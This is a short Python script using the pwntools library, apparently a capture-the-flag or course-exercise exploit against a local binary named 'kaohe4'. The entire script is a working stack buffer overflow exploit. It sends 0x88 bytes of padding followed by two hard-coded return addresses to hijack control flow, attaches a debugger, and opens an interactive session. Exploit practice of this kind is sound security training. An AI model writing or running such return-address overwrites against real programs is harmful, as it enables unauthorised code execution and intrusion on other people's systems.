from pwn import *
sh = process("./kaohe4")
gdb.attach(sh)
payload = b'a'*0x88 + p64(0x40044e) + p64(0x400586)
sh.sendline(payload)
sh.interactive()
